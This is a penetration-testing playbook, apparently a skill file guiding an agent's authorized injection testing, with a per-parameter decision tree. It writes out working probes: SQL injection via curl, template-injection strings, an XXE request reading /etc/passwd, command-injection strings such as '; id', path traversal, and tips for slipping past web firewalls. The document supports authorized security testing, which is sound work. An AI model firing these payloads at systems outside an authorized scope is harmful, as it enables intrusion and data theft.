# Injection (SQLi, SSTI, XXE, CMDi, Deserialization)

**Prerequisite:** In-scope target in [`../../AUTHORIZATION.md`](../../AUTHORIZATION.md). Use Burp Collaborator/canary for blind issues. No data destruction.

## Decision tree

```text
For EACH param in intel.params (or proxy history):
├─ Reflected string → SSTI {{7*7}} → XSS context → SQLi '
├─ Numeric → SQLi OR 1=1, boundary, idor overlap
├─ JSON value → type confusion, nested injection, ${jndi:} (legacy)
├─ XML/SOAP body → XXE
├─ File/path → LFI ../../../../etc/passwd (read-only PoC)
├─ OS command style (ping, nslookup arg) → CMDi ; id
└─ Java/PHP serialized cookie → deserialization gadget (lab/RoE)
```

## SQLi

```bash
# Error-based probe
curl -sk "https://app.example.com/api/users?id=1'"
curl -sk "https://app.example.com/api/users?id=1 AND 1=2--"

# Time-based (confirm with baseline)
curl -sk "https://app.example.com/api/users?id=1' AND SLEEP(5)--"
```

Burp Intruder: `'`, `"`, `' OR '1'='1`, `1 UNION SELECT NULL--` on each param.  
sqlmap (only if program allows): `sqlmap -u 'URL' --batch --level=2 --risk=1 --threads=1`

## SSTI

```
{{7*7}}
${7*7}
<%= 7*7 %>
#{7*7}
*{7*7}
```

If `49` in response → identify engine (Jinja2, Freemarker, Twig, ERB).

## XXE

```http
POST /api/xml HTTP/1.1
Content-Type: application/xml

<?xml version="1.0"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<root>&xxe;</root>
```

Blind: OOB entity to Collaborator.

## Command injection

```
; id
| id
`id`
$(id)
& ping -c 1 COLLAB
```

On params: `host`, `ip`, `domain`, `file`, `filename`, `cmd`.

## Deserialization (authorized lab)

- Java: look for `rO0` base64 cookies → ysoserial (lab only)
- PHP: `O:` in params → phpggc
- .NET: ViewState — separate skill if needed

## WAF bypass (when blocked)

- Encoding, case swap, comment injection `/**/`, double URL encode
- Move to JSON body if GET blocked
- `intel.waf` note → tune payloads

## Senior pass checklist

- [ ] Every intel `params[]` entry tested or in `blocked`
- [ ] JSON APIs: content-type swap (json ↔ form)
- [ ] Second-order: store payload → trigger in admin/export view
- [ ] mark-done `injection_pass`

```bash
ENG=engagement/app.example.com
python3 ../../scripts/intel.py $ENG/intel.json add-param "GET /api/search?q"
python3 ../../scripts/intel.py $ENG/intel.json mark-done injection_pass
python3 ../../scripts/surface_audit.py $ENG/intel.json
```

## Handoff

- SSRF via URL param → `ssrf`
- File read → check LFI→RCE only in lab
- Confirmed → `reporting`
